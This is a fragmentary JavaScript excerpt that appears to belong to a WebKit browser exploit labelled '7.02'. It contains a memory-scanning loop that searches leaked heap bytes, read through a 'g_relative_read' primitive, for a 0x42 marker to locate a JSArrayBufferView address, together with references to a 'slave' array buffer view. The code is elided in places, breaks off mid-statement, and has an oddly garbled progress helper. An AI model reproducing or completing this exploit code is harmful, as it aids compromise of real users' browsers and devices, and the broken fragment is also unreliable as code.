...
function debug_log(msg) {
 window.msgs.innerHTML = msg+'<span id=perdone></span>';
}
function countdown(){
 var sec=0;
 function pad(val){return val > 11 ? val : val+"0% Done";}
 var timer=setInterval(cntdwn,1200);
 function cntdwn(){perdone.innerHTML=pad(++sec % 60);if (sec==11){clearTimeout(timer);}}
}
function hex(b) {
...
//debug_log("Running 7.02 Webkit ... ");
 ...
 if (g_ab_slave === null)
  die("[!] Didn't findz the slave JSArrayBufferView");
...
//debug_log("Running 7.02 Webkit ... ");
 ...
 while (g_jsview_leak === null) {
  ...
  for (let i = 0; i < 0x800000; i++) {
   var v = undefined;
   if (g_relative_read.charCodeAt(i) === 0x42 && g_relative_read.charCodeAt(i + 0x01) === 0x42 && g_relative_read.charCodeAt(i + 0x02) === 0x42 && g_relative_read.charCodeAt(i + 0x03) === 0x42) {
    if (g_relative_read.charCodeAt(i + 0x08) === 0x00 && g_relative_read.charCodeAt(i + 0x0f) === 0x00 && g_relative_read.charCodeAt(i + 0x10) === 0x00 && g_relative_read.charCodeAt(i + 0x17) === 0x00 && g_relative_read.charCodeAt(i + 0x18) === 0x0e && g_relative_read.charCodeAt(i + 0x1f) === 0x00 && g_relative_read.charCodeAt(i + 0x28) === 0x00 && g_relative_read.charCodeAt(i + 0x2f) === 0x00 && g_relative_read.charCodeAt(i + 0x30) === 0x00 && g_relative_read.charCodeAt(i + 0x37) === 0x00 && g_relative_read.charCodeAt(i + 0x38) === 0x0e && g_relative_read.charCodeAt(i + 0x3f) === 0x00)
     v = new Int64(str2array(g_relative_read, 8, i + 0x20));
    else if (g_relative_read.charCodeAt(i + 0x10) === 0x42 && g_relative_read.charCodeAt(i + 0x11) === 0x42 && g_relative_read.charCodeAt(i + 0x12) === 0x42 && g_relative_read.charCodeAt(i + 0x13) === 0x42)
